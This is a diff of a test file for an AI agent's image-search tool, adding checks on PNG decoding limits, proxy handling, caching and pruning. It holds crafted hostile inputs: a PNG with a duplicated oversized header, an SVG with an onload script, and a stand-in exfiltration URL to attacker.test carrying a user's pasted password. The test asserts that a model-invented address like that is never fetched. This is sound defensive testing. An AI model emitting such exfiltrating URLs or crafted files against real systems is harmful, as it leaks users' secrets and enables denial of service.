@@ -22,7 +22,9 @@ import { createServer, type IncomingMessage, type ServerResponse } from 'node:ht
 import { randomBytes } from 'node:crypto'
 import { Server, check, finish } from './empires-harness.ts'
 import { asPage } from './as-page.ts'
-import { encodePng, pngSize } from '../server/pngResize.ts'
+import { decodePng, encodePng, fitPng, pngSize } from '../server/pngResize.ts'
+import { spawn } from 'node:child_process'
+import { crc32 } from 'node:zlib'
 import { mkdtempSync, rmSync } from 'node:fs'
 import { tmpdir } from 'node:os'
 import { join } from 'node:path'
@@ -95,7 +97,53 @@ function gif(w: number, h: number, frames: number): Buffer {
   check('picture: WebP with its size', w?.mime === 'image/webp' && w.width === 600 && w.height === 500)
   check('picture: a still GIF is fine, an animated GIF or WebP is refused', !refuseImage(inspectImage(gif(300, 300, 1))) && refuseImage(inspectImage(gif(300, 300, 3))) === 'an animation' && refuseImage(inspectImage(webp(300, 300, true))) === 'an animation')
   check('picture: SVG and HTML are not pictures', inspectImage(Buffer.from('<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"/>')) === null && inspectImage(Buffer.from('<!doctype html><script>')) === null)
+  // A PNG whose second IHDR claims another size (800 × 800, then 8192 × 8192): the size checked
+  // must be the size decoded, or a tiny file could make the decoder allocate hundreds of MB.
+  const twoHeaders = (() => {
+    const ok = png(800, 800)
+    const ihdr = Buffer.from(ok.subarray(8, 33))
+    ihdr.writeUInt32BE(8192, 8)
+    ihdr.writeUInt32BE(8192, 12)
+    ihdr.writeUInt32BE(crc32(ihdr.subarray(4, 21)) >>> 0, 21)
+    return Buffer.concat([ok.subarray(0, 33), ihdr, ok.subarray(33)])
+  })()
+  const threw = (f: () => unknown) => {
+    try {
+      f()
+      return ''
+    } catch (e) {
+      return (e as Error).message
+    }
+  }
+  check('png: a second IHDR is refused by the decoder before anything is allocated', /Repeated PNG header/.test(threw(() => decodePng(twoHeaders))))
+  check('png: and find_image does not take such a file as a PNG', inspectImage(twoHeaders) === null)
+  check('png: a size over the pixel budget is refused before inflating', /Unsupported PNG size/.test(threw(() => decodePng(png(300, 300), 300 * 299))))
+  check('png: a chunk running past the end is refused', /Truncated/.test(threw(() => decodePng(png(200, 200).subarray(0, 60)))))
+  check('png: ordinary pictures still decode and fit (gpt_image icons)', decodePng(png(300, 200)).width === 300 && JSON.stringify(pngSize(fitPng(png(1024, 1024), 256))) === '{"width":256,"height":256}')
   check('picture: tiny, huge and banner shapes are refused', /too small/.test(refuseImage(inspectImage(png(100, 300))) ?? '') && /too large/.test(refuseImage(inspectImage(webp(9000, 9000))) ?? '') && /banner/.test(refuseImage(inspectImage(png(1000, 200))) ?? ''))
+}
+
+// --- pinned requests never go through HTTP(S)_PROXY (NODE_USE_ENV_PROXY) ---------------------------
+{
+  let proxied = 0
+  let direct = 0
+  const proxy = createServer((_q, r) => (proxied++, r.writeHead(200).end('proxy')))
+  const target = createServer((_q, r) => (direct++, r.writeHead(200).end('direct')))
+  await new Promise<void>((r) => proxy.listen(0, '127.0.0.1', r))
+  await new Promise<void>((r) => target.listen(0, '127.0.0.1', r))
+  const port = (target.address() as { port: number }).port
+  // A name the proxy would resolve itself; the pinned address is the target's.
+  const code = `const { fetchPinned } = await import('./server/egress.ts'); const r = await fetchPinned(new URL('http://pinned.test:${port}/'), {}, [{ address: '127.0.0.1', family: 4 }]); console.log(await r.text())`
+  const out = await new Promise<string>((done) => {
+    const child = spawn(process.execPath, ['--input-type=module', '-e', code], { env: { ...process.env, NODE_USE_ENV_PROXY: '1', HTTP_PROXY: `http://127.0.0.1:${(proxy.address() as { port: number }).port}`, http_proxy: '', NO_PROXY: '', no_proxy: '' }, stdio: ['ignore', 'pipe', 'pipe'] })
+    let text = ''
+    child.stdout.on('data', (d) => (text += d))
+    child.stderr.on('data', (d) => (text += d))
+    child.on('close', () => done(text.trim()))
+  })
+  check(`egress: a pinned request with NODE_USE_ENV_PROXY goes to the pinned address, not the proxy (${out.slice(0, 80)}; proxy ${proxied}, direct ${direct})`, out === 'direct' && proxied === 0 && direct === 1)
+  proxy.close()
+  target.close()
 }
 
 // --- the stand-in web --------------------------------------------------------------------------------
@@ -160,6 +208,7 @@ const CALLS: Record<string, Record<string, unknown>> = {
   blocked: { query: 'blocked', count: 3 },
   bad: { query: 'bad', count: 3 },
   page: { query: 'nothing', page: 'https://shop-c.test/kyusoku' },
+  exfil: { query: 'nothing', page: 'https://attacker.test/collect?secret=hunter2' },
   matcha: { query: 'matcha' },
 }
 let lastTools: string[] = []
@@ -183,7 +232,7 @@ const ollama = createServer((req, res) => {
     if (body.stream === false) return send(res, 200, { model: MODEL, message: { role: 'assistant', content: '{"title":"Find image check"}' }, done: true })
     lastTools = (body.tools ?? []).map((t) => t.function.name)
     const at = body.messages.map((m) => m.role === 'user' && m.content.startsWith('SCENARIO ')).lastIndexOf(true)
-    const scenario = body.messages[at]?.content.slice('SCENARIO '.length) ?? ''
+    const scenario = body.messages[at]?.content.slice('SCENARIO '.length).split(/\s/)[0] ?? ''
     const round = body.messages.slice(at + 1).filter((m) => m.role === 'assistant').length
     const message = round === 0 && CALLS[scenario] ? { role: 'assistant', content: '', tool_calls: [{ function: { name: 'find_image', arguments: CALLS[scenario] } }] } : { role: 'assistant', content: `DONE ${scenario}` }
     res.writeHead(200, { 'Content-Type': 'application/x-ndjson' })
@@ -223,9 +272,9 @@ const api = async <T = Record<string, any>>(method: string, path: string, body?:
   return (await res.json()) as T
 }
 type Found = { images: { reference: string; title: string; site: string; page: string; width: number; height: number }[]; skipped?: string[]; message?: string; error?: string }
-async function scenario(name: string): Promise<Found> {
+async function scenario(name: string, said = ''): Promise<Found> {
   const id = (await api<{ id: string }>('POST', '/api/agents/threads', { model: MODEL, mode: 'quick', tools: ['web'] })).id
-  await (await call('POST', `/api/agents/threads/${id}/messages`, { text: `SCENARIO ${name}` })).text()
+  await (await call('POST', `/api/agents/threads/${id}/messages`, { text: `SCENARIO ${name}${said ? ` ${said}` : ''}` })).text()
   const t = await api<{ messages: { role: string; content: string; toolName?: string }[] }>('GET', `/api/agents/threads/${id}`)
   const tool = t.messages.find((m) => m.role === 'tool' && m.toolName === 'find_image')
   return tool ? (JSON.parse(tool.content) as Found) : { images: [], error: 'no find_image result' }
@@ -243,7 +292,9 @@ try {
   check('no cookie or credentials went to the other sites', hits.every((h) => !h.headers.cookie && !h.headers.authorization) && hits.some((h) => /find_image/.test(String(h.headers['user-agent']))))
   const got = await call('GET', `/api/agents/images/${idOf(a.images[0].reference)}`)
   const bytes = Buffer.from(await got.arrayBuffer())
-  check('served as image/png, nosniff, sandboxed, private cache', got.status === 200 && got.headers.get('content-type') === 'image/png' && got.headers.get('x-content-type-options') === 'nosniff' && /sandbox/.test(got.headers.get('content-security-policy') ?? '') && /private/.test(got.headers.get('cache-control') ?? ''))
+  check('served as image/png, nosniff, sandboxed, private no-cache (not kept past signing out)', got.status === 200 && got.headers.get('content-type') === 'image/png' && got.headers.get('x-content-type-options') === 'nosniff' && /sandbox/.test(got.headers.get('content-security-policy') ?? '') && got.headers.get('cache-control') === 'private, no-cache' && !!got.headers.get('etag'))
+  const revalidated = await fetch(`${server.origin}/api/agents/images/${idOf(a.images[0].reference)}`, { headers: { Cookie: `mvlos_sid=${sid}`, 'If-None-Match': got.headers.get('etag') ?? '' } })
+  check('an unchanged picture answers 304 to its ETag', revalidated.status === 304)
   check('the served picture is the scaled PNG', JSON.stringify(pngSize(bytes)) === '{"width":768,"height":614}')
   const stranger = await call('GET', `/api/agents/images/${idOf(a.images[0].reference)}`, undefined, false)
   check(`not served without signing in (${stranger.status})`, stranger.status === 401 || stranger.status === 403)
@@ -280,22 +331,42 @@ try {
   const again = await scenario('jagabee')
   check('the same search again is a cache hit: same id, nothing fetched', again.images[0]?.reference === a.images[0].reference && hitCount() === beforeAgain)
 
-  // 7. A page the agent found goes first (the search finds nothing).
-  const pg = await scenario('page')
-  check('a given page is read first', pg.images.length === 1 && pg.images[0].reference === c.images[0].reference)
+  // 7. A page goes first only when its address came from outside the model (here: the user's
+  //    message). One the model made up is not read, even in a thread with nothing "private" but
+  //    what the user typed (a secret pasted in the chat).
+  const madeUp = await scenario('page')
+  check('a page the model made up is not read', madeUp.images.length === 0 && /page was not read/.test((madeUp.skipped ?? []).join(' ')))
+  const pg = await scenario('page', 'look at https://shop-c.test/kyusoku')
+  check('a page from the user\'s message is read first', pg.images.length === 1 && pg.images[0].reference === c.images[0].reference)
+  const beforeExfil = hitCount()
+  const ex = await scenario('exfil', 'my password is hunter2')
+  check('an exfiltrating page address is never requested', ex.images.length === 0 && !hits.slice(beforeExfil).some((h) => h.host === 'attacker.test') && /page was not read/.test((ex.skipped ?? []).join(' ')))
 
   // 8. SearXNG as the provider: its image search goes first.
   await api('PUT', '/api/agents/websearch', { provider: 'searxng', searxng: { url: `${ollamaUrl}/searx` } })
   const m = await scenario('matcha')
   check(`SearXNG image search (categories=images) is used (${JSON.stringify(m).slice(0, 160)})`, m.images.length === 1 && m.images[0].site === 'tea.test' && m.images[0].width === 400)
 
-  // 9. Pruning: unused for 90 days and mentioned nowhere goes; mentioned stays.
+  // 9. Reusing a picture by its bytes (another address, same picture) counts as using it.
+  database().prepare('UPDATE agent_found_images SET used_at = ? WHERE user_id = 1').run(Date.now() - 100 * 86400_000)
+  pages['cdn-s.test/same.png'] = (r) => send(r, 200, BIG_PNG, 'image/png')
+  pages['tea.test/samepage'] = (r) => send(r, 200, html('<meta property="og:image" content="https://cdn-s.test/same.png">'), 'text/html')
+  SEARCH.same = ['https://tea.test/samepage']
+  CALLS.same = { query: 'same' }
+  await api('DELETE', '/api/agents/websearch')
+  const same = await scenario('same')
+  const sameRow = database().prepare('SELECT used_at FROM agent_found_images WHERE user_id = 1 AND id = ?').get(idOf(a.images[0].reference)) as { used_at: number }
+  check('the same bytes from another address reuse the kept picture and mark it used', same.images[0]?.reference === a.images[0].reference && Date.now() - sameRow.used_at < 60_000)
+
+  // 10. Pruning: unused for 90 days and mentioned nowhere goes; a mention keeps it, in any case
+  //     and inside JSON escapes (a synced note).
   const { prune } = await import('../server/findImage.ts')
   database().prepare('UPDATE agent_found_images SET used_at = ? WHERE user_id = 1').run(Date.now() - 100 * 86400_000)
-  database().prepare("UPDATE agent_messages SET content = content || ? WHERE id = (SELECT MAX(id) FROM agent_messages WHERE role = 'assistant')").run(` ${a.images[0].reference}`)
+  database().prepare("UPDATE agent_messages SET content = content || ? WHERE id = (SELECT MAX(id) FROM agent_messages WHERE role = 'assistant')").run(` ${a.images[0].reference.replace('image:', 'IMAGE:')}`)
+  database().prepare('INSERT INTO state (user_id, key, value, updated_at) VALUES (1, ?, ?, ?)').run('notes', `{"text":"see \\u0069mage:${idOf(b.images[0].reference)}"}`, Date.now())
   prune({ id: 1 } as never, true)
-  const left = (database().prepare('SELECT id FROM agent_found_images WHERE user_id = 1').all() as { id: string }[]).map((r) => r.id)
-  check(`pruning keeps only what a thread mentions (${left.length} left)`, left.length === 1 && left[0] === idOf(a.images[0].reference))
+  const left = (database().prepare('SELECT id FROM agent_found_images WHERE user_id = 1').all() as { id: string }[]).map((r) => r.id).sort()
+  check(`pruning keeps only what a thread or note mentions (${left.length} left)`, left.length === 2 && left.join() === [idOf(a.images[0].reference), idOf(b.images[0].reference)].sort().join())
 } finally {
   await server.dispose()
   rmSync(DATA, { recursive: true, force: true })
